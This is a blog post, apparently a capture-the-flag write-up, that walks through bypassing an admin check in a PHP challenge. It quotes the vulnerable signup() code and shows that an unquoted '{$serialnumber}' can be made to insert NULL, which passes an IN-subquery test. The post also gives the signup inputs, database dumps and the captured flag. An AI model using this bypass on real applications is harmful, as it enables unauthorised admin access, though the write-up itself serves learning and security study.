---
layout: post
title: Hack Dat Kiwi CTF 2017 - Serial Number
post_author: pyno
excerpt_separator: <!--more-->
---

The challenge here is to bypass a creative authentication mechanism.
You can download the server's source code at [link](#), and run
it in local as I did during the CTF.

\<tl;dr\>

To have the flag you just need to login with a serialnuber which
exists in a table named 'serialnumbers', initially populated with
2 entries.

To bypass authentication and print the flag just signup as:
```
Username: pyno
Password: pyno
Serialnumber: serialnumber
```
And then login with the user pyno.

\</tl;dr\>

<!--more-->
Having a look at the code you will notice that all but one input that 
are put in queries are correctly sanitized with placeholders, so it 
was easy to identify the vulnerable point in signup() function, file
user.php:
```php
function signup($username,$password,$serialnumber)
{
	if (!ctype_alnum($serialnumber)) return false;
	if (!ctype_alnum($username)) return false;
	if (!$username or !$serialnumber) return;
	if (sql("select * from users where username=?",$username))
		return false;
	return sql("insert into users (username,password,serialnumber) 
			values ('$username','".md5($password)."',{$serialnumber})");
}
```
But at the beginning of this function serialnumber and username parameters 
are filtered with `ctype_alnum()` (i.e. only alphanumerical chars), and the
password is hashed before the query is executed... Woah challenging!

After a closer look to the query I realized that the variable 
`$serialnumber` is not included in quotes (interesting..)
and, since I'm not very familiar to PHP, it took me some google 
searches to work out what the notation `{$serialnumber}` stands 
for. 

This example should clarify this syntax for those like me who is not
so handy with PHP:
```php
php> $z = "magic";
php> $y = "z";
php> $str = "It's a kind of ${$y} :D";
php> echo $str;
It's a kind of magic :D
```

Ok now let's take a look to the isadmin() function which is the one
we have to bypass with our injection:
```php
function isadmin($user)
{
	return sql("select ? in (select serialnumber from serialnumbers) as result",
		$user->serialnumber)[0]->result!=="0";
}

```
To satisfy this condition we just need the query to return at least one row.
So we need either to:
1. have the same serialnumber of an admin, or
2. inject a serial number into the serialnumbers table (this is not done when
the user is added legitimately), or
3. have somehow magically a row returned by the query

**Option** 1. Clearly impossible. Infact, even if I had known an admin serial
number, the serialnumber field is set to UNIQUE in table users.

**Option** 2. Unexcaped var. With the PHP `${}` trick in mind I looked at 
unescaped variables that I could reference and, hey, the  `$password` vairable 
seems good!

So I tryied to put the injection in the password field doing a signup like:
```
Username: pypy
Password: 1234
Serialnumber: password
```
This way if I found in serialnumber the value 1234 means I'm able to inject
the payload in the password field. But unfortunately:

```sql
MariaDB [ctf]> select * from users;
+----+------------+--------------+----------------------------------+
| id | username   | serialnumber | password                         |
+----+------------+--------------+----------------------------------+
|  1 | admin      |   2147483647 | 8a26855bd1fe07fc3ec200dfa95cbc55 |
|  2 | kiwimaster |    287364618 | b91f928fb04ab6ce909d46280a00133b |
| 17 | ffdsfds    |        83878 | 83878c91171338902e0fe0fb97a8c47a |
| 18 | ax         |     85472373 | 85472373acac8668b4444dcc4a73ace5 |
| 19 | kljjjjj    |     24830589 | 24830589c2c78c189bc4911670f96624 |
| 33 | calla      |            8 | 8d8cedbaa9c9ce576daa3990991862b3 |
| 38 | pypy       |           81 | 81dc9bdb52d04dc20036dbd8313ed055 |
+----+------------+--------------+----------------------------------+
19 rows in set (0.00 sec)
```
It is evident that I can reference the variable `$password` only after the 
md5, so it is useless.

**Option 3**. Try them all. We said we need the query in isadmin() function
somehow to return at least a tuple. We have only 2 variables left.
Since refering to username which is excaped too doesn't seems too
promising, I tried to refer to the serialnumber variable itself.

```
Username: pyno
Password: pyno
Serialnumber: serialnumber
```

What appened surprised me a little:

```
MariaDB [ctf]> select * from users;
+----+------------+--------------+----------------------------------+
| id | username   | serialnumber | password                         |
+----+------------+--------------+----------------------------------+
|  1 | admin      |   2147483647 | 8a26855bd1fe07fc3ec200dfa95cbc55 |
|  2 | kiwimaster |    287364618 | b91f928fb04ab6ce909d46280a00133b |
| 17 | ffdsfds    |        83878 | 83878c91171338902e0fe0fb97a8c47a |
| 18 | ax         |     85472373 | 85472373acac8668b4444dcc4a73ace5 |
| 19 | kljjjjj    |     24830589 | 24830589c2c78c189bc4911670f96624 |
| 33 | calla      |            8 | 8d8cedbaa9c9ce576daa3990991862b3 |
| 38 | pypy       |           81 | 81dc9bdb52d04dc20036dbd8313ed055 |
| 39 | pyno       |         NULL | ae7e3a33fda6ac06a69bec3d5cec16a1 |
+----+------------+--------------+----------------------------------+
```
Hey null, null is good, NULL IS COOL! Let's try a query like the one in
isadmin() when filled with a NULL serialnumber:

```SQL
MariaDB [ctf]> select NULL in (select serialnumber from serialnumbers) as result;
+--------+
| result |
+--------+
|   NULL |
+--------+
1 row in set (0.00 sec)

```
One row! Urray!

So doing login with the pyno user I finally got the flag: VBPspiFWv8NYqBt

** **NOTE** **

A simpler solution is reported by kiwi CTF authors in their 
[Auto-Write-Up](http://2017.hack.dat.kiwi/writeup). They use a direct
approach to exploit the null pointer vulnerability by simply inserting
NULL as serialnumber in the signup form.



